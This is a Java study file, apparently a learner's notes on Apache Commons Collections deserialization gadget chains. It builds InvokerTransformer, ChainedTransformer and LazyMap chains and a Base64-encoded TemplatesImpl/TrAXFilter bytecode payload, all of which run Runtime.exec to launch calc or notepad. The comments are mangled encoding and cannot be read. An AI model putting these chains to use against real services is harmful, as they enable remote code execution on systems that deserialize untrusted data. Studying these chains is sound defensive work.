package CC;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;


public class InvokerTransformerStudy {
    public static void main(String[] args) throws Exception {
        InvokerTransformerStudy i = new InvokerTransformerStudy();
        i.testTrAXFilter();
    }

    public void testReflect() throws Exception{
        //�Ը�payload����
        Runtime.getRuntime().exec("calc");

        //ͨ���������
        //1��Runtime.class.getMethod("getRuntime",null).invoke(null,null).exec("calc");
        Runtime run = (Runtime) Runtime.class.getMethod("getRuntime", null).invoke(null, null);
        run.exec("calc");

        /**
         * 2����ȫͨ�����䷽ʽ���ã�invoke�д������Ҫִ�еĶ��󣬲�����getMethod�д������Ҫִ�еķ�����
         * Q��ΪʲôRuntimeֱ���ܻ�ȡexec��������
         * A����ΪRuntime.class���࣬Ҫ����getRuntime����ʵ��������getRuntime�ڵ�һ��invoke������
         */
        Runtime.class.getMethod("exec",String.class)
                .invoke(
                        Runtime.class
                                .getMethod("getRuntime")
                                .invoke(null),"calc");

        Class.forName("java.lang.Runtime")
                .getMethod("exec", String.class)
                .invoke(
                        //��Ҫ����getRuntime����getRuntime������ô�������������ִ�����getRuntime����������һ������
                        Class.forName("java.lang.Runtime")
                                .getMethod("getRuntime")
                                //����invoke����Ϊnull����Ϊ����Ҫ�������󣬱�ʾ���þ�̬����
                                .invoke(null)
                        ,"calc"
                );
    }

    /**
     * ֻҪ��������transformer.transform()�����ĵ��ü��ɣ�����������ʲô������
     * ��Ϊtransform()�����л�ͨ���������ָ���ķ���
     */
    public void testInvokerTransform(){
        //���ص���transformer���󣬷���������������(new Class[])������/��Ҫִ�еĲ����Ķ�������(new Object[])
        Transformer transformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        //��transform����д��transform�������������ָ���ķ��������ط������ý��
        transformer.transform(Runtime.getRuntime());
    }

    public void testChain(){
        //ChainedTransformer,������ʽ����
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"notepad"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        //��δ���chain��transform�ͺ�����Ҫ��
        chainedTransformer.transform("test");
    }

    public void testLazyMap(){
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"notepad"})
                }
        );

        HashMap uselessMap = new HashMap();
        //lazyMap:��һ��Map����ת������һ��Map����������Ҫ������Transform�����µ�Map���󱻷���ʱ��lazyMap�Ὣ���󴫵ݸ�ԭʼ��Map��Ȼ��ת�����������������µ�ֵ
        Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);
        //get�������и�if�жϣ����Map�в����ڸü�����ͨ��transformChain��������Ӧ��ֵ���ҷŵ�Map�У������أ���ô��ε���get������
        lazyMap.get("test");
    }


    //�������� Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void testTemplate() throws TransformerConfigurationException {
        //�����ֽ���
        byte[] code = Base64.getDecoder().decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
        //�������� Field��TemplatesImpl�಻��Apache commons��
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());
        //����newTransformer��������һ���µ�Transformer����ķ�����cc-3��TrAX�õ����������
        templates.newTransformer();
    }


    public void testTrAXFilter(){
        //�ֽ���
        byte[] code = Base64.getDecoder().decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");

        //�������� Field
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

        //InstantiateTransformer����transform��������ָ�������ʵ������һ��������ģ���࣬�ڶ���������������
        Transformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        //transform()���������жϣ�����TrAX�������жϣ��жϴ���Ĳ����ǲ���instanceof Class����������͵���newInstance����������Instantiate�ڶ�������������ʵ��
        //TrAX���ڽ�XML�ĵ�ת����������ʽ
        instantiateTransformer.transform(TrAXFilter.class);
        ///123123
    }
}
